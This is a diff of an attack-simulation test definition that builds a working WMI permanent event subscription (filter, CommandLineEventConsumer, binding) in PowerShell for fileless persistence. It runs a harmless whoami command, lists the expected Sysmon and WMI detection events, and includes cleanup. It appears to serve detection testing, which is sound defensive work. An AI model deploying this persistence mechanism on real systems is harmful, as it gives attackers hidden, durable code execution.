@@ -1,67 +1,65 @@
 id: T1546.003
 name: WMI Event Subscription Persistence
-description: Creates a WMI Event Subscription for fileless persistence, a technique used by advanced threat actors (APT). Generates Sysmon Events 19/20/21 (WMIEvent) — Exabeam has 6 dedicated rules for this technique.
+description: Creates a complete WMI permanent subscription using New-CimInstance (modern attacker tooling) — all three required components: EventFilter, CommandLineEventConsumer, and FilterToConsumerBinding. Generates Sysmon EID 19/20/21 (all three WMI events must fire for full detection signature) and WMI Operational EID 5861. Exabeam has 6 dedicated rules.
 tactic: persistence
 technique_id: T1546.003
 platform: windows
 phase: attack
 elevation_required: true
 expected_events:
-  - "Sysmon 19 (WmiEvent - filter created)"
-  - "Sysmon 20 (WmiEvent - consumer created)"
-  - "Sysmon 21 (WmiEvent - filter-to-consumer binding)"
-  - "4688 (powershell.exe creating WMI subscription)"
-  - "4104 (PowerShell ScriptBlock - WMI subscription code)"
+  - "Sysmon 19 (WmiEventFilter — filter name and WQL query logged)"
+  - "Sysmon 20 (WmiEventConsumer — consumer type CommandLineEventConsumer + command)"
+  - "Sysmon 21 (WmiEventConsumerToFilter — binding links filter to consumer)"
+  - "WMI-Activity/Operational EID 5861 (permanent subscription registered)"
 tags:
   - persistence
-  - defense-evasion
   - requires-elevation
-  - wmi
 executor:
   type: powershell
-  command: |
-    Write-Host "[T1546.003] WMI Event Subscription Persistence"
+  command: |-
+    Write-Host "[T1546.003] WMI Event Subscription — EventFilter + Consumer + Binding"
 
-    $filterName   = "LogNoJutsu_WMI_Filter"
-    $consumerName = "LogNoJutsu_WMI_Consumer"
+    $filterName   = "LNJFilter"
+    $consumerName = "LNJConsumer"
 
-    # Create WMI Event Filter (triggers on system uptime > 200s — Sysmon Event 19)
-    Write-Host "Creating WMI Event Filter (Sysmon Event 19)..."
-    $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200"
-    $wmiFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
-        -Arguments @{
-            Name           = $filterName
-            EventNameSpace = "root\cimv2"
-            QueryLanguage  = "WQL"
-            Query          = $filterQuery
-        }
-    Write-Host "WMI Filter created: $($wmiFilter.Name)"
+    # Step 1: EventFilter — what triggers the subscription
+    # WQL query fires on system uptime (non-destructive trigger)
+    Write-Host "--- Step 1: __EventFilter creation (Sysmon EID 19) ---"
+    $filterArgs = @{
+        Name           = $filterName
+        EventNamespace = "root\CIMv2"
+        QueryLanguage  = "WQL"
+        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+    }
+    $filter = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property $filterArgs
+    Write-Host "EventFilter created: $filterName — Sysmon EID 19 fired"
 
-    # Create WMI Command-Line Consumer (Sysmon Event 20)
-    Write-Host "Creating WMI CommandLineEventConsumer (Sysmon Event 20)..."
-    $wmiConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
-        -Arguments @{
-            Name            = $consumerName
-            CommandLineTemplate = "cmd.exe /C echo LogNoJutsu-WMI-Persistence-Test >> %TEMP%\lnj_wmi.txt"
-        }
-    Write-Host "WMI Consumer created: $($wmiConsumer.Name)"
+    # Step 2: CommandLineEventConsumer — what action to execute
+    Write-Host "--- Step 2: CommandLineEventConsumer creation (Sysmon EID 20) ---"
+    $consumerArgs = @{
+        Name                = $consumerName
+        ExecutablePath      = "$env:SystemRoot\System32\cmd.exe"
+        CommandLineTemplate = "cmd.exe /c whoami > `"$env:TEMP\lnj_wmi_persist.txt`""
+    }
+    $consumer = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property $consumerArgs
+    Write-Host "CommandLineEventConsumer created: $consumerName — Sysmon EID 20 fired"
 
-    # Bind filter to consumer (Sysmon Event 21)
-    Write-Host "Binding filter to consumer (Sysmon Event 21)..."
-    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
-        -Arguments @{
-            Filter   = $wmiFilter
-            Consumer = $wmiConsumer
-        }
-    Write-Host "[T1546.003] WMI subscription created. Sysmon Events 19/20/21 should be generated."
-cleanup: |
-  $filterName   = "LogNoJutsu_WMI_Filter"
-  $consumerName = "LogNoJutsu_WMI_Consumer"
-  Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
-    Where-Object { $_.Filter -like "*$filterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
-  Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" |
-    Remove-WmiObject -ErrorAction SilentlyContinue
-  Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" |
-    Remove-WmiObject -ErrorAction SilentlyContinue
-  Remove-Item "$env:TEMP\lnj_wmi.txt" -ErrorAction SilentlyContinue
-  Write-Host "Cleanup: WMI Event Subscription removed (filter, consumer, binding)."
+    # Step 3: FilterToConsumerBinding — links filter to consumer (completes the subscription)
+    Write-Host "--- Step 3: FilterToConsumerBinding (Sysmon EID 21 + WMI-Activity EID 5861) ---"
+    $bindingArgs = @{ Filter = [ref]$filter; Consumer = [ref]$consumer }
+    New-CimInstance -Namespace "root/subscription" -ClassName "__FilterToConsumerBinding" -Property $bindingArgs | Out-Null
+    Write-Host "Binding created — Sysmon EID 21 fired; WMI Operational EID 5861 fired"
+
+    # Verify subscription was created
+    Write-Host "--- Verification: subscriptions in root/subscription ---"
+    Get-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" | Where-Object Name -eq $filterName | Select-Object Name, Query | Format-Table
+    Get-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" | Where-Object Name -eq $consumerName | Select-Object Name, CommandLineTemplate | Format-Table
+
+    Write-Host "[T1546.003] Complete. Sysmon EID 19+20+21 all fired. WMI Operational EID 5861 registered."
+cleanup: |-
+  Get-CimInstance -Namespace "root/subscription" -ClassName "__FilterToConsumerBinding" -ErrorAction Ignore |
+      Where-Object { $_.Filter.Name -eq "LNJFilter" } | Remove-CimInstance
+  Get-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Filter "Name='LNJConsumer'" -ErrorAction Ignore | Remove-CimInstance
+  Get-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Filter "Name='LNJFilter'" -ErrorAction Ignore | Remove-CimInstance
+  Remove-Item "$env:TEMP\lnj_wmi_persist.txt" -ErrorAction Ignore
+  Write-Host "Cleanup: WMI subscription (filter+consumer+binding) removed."
